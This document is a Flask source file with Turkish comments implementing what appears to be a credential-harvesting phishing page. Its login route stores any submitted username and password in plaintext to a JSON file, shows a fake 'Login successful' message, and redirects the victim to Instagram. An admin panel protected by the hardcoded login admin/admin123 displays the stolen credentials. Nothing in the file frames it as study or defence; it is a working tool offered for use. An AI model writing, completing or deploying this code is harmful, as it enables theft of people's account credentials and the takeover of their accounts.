from flask import Flask, render_template, request, redirect, flash, url_for, session
import json
import os

app = Flask(__name__)
app.secret_key = 'your_secret_key'

# JSON dosyasının yolu
JSON_FILE = 'users_data.json'

# JSON dosyasını okuma fonksiyonu
def load_users():
    if os.path.exists(JSON_FILE):
        with open(JSON_FILE, 'r') as file:
            return json.load(file)
    return []

# JSON dosyasına yazma fonksiyonu
def save_user_data(users):
    with open(JSON_FILE, 'w') as file:
        json.dump(users, file, indent=4)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login_post():
    username = request.form['username']
    password = request.form['password']

    if username and password:
        users_data = load_users()
        users_data.append({'username': username, 'password': password})
        save_user_data(users_data)

        flash('Login successful!', 'success')
        return redirect("https://www.instagram.com/")
    else:
        flash('Invalid credentials, please try again.', 'danger')
        return redirect(url_for('login'))

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        admin_username = request.form['admin_username']
        admin_password = request.form['admin_password']

        if admin_username == "admin" and admin_password == "admin123":
            session['admin'] = True
            flash('Admin login successful!', 'success')

            # Admin giriş yaptıktan sonra yönlendirme
            return redirect(url_for('show_users'))
        else:
            flash('Invalid admin credentials!', 'danger')
            return redirect(url_for('admin_login'))

    return render_template('admin_login.html')

@app.route('/show_users')
def show_users():
    # Admin oturumu kontrolü
    if 'admin' not in session:
        flash('You must log in as admin to view this page.', 'warning')
        return redirect(url_for('admin_login'))

    users_data = load_users()
    return render_template('show_users.html', users=users_data)

@app.route('/admin_logout', methods=['POST'])
def admin_logout():
    session.pop('admin', None)
    flash('You have been logged out successfully.', 'info')
    return redirect('https://www.google.com')


if __name__ == "__main__":
    app.run(debug=True)
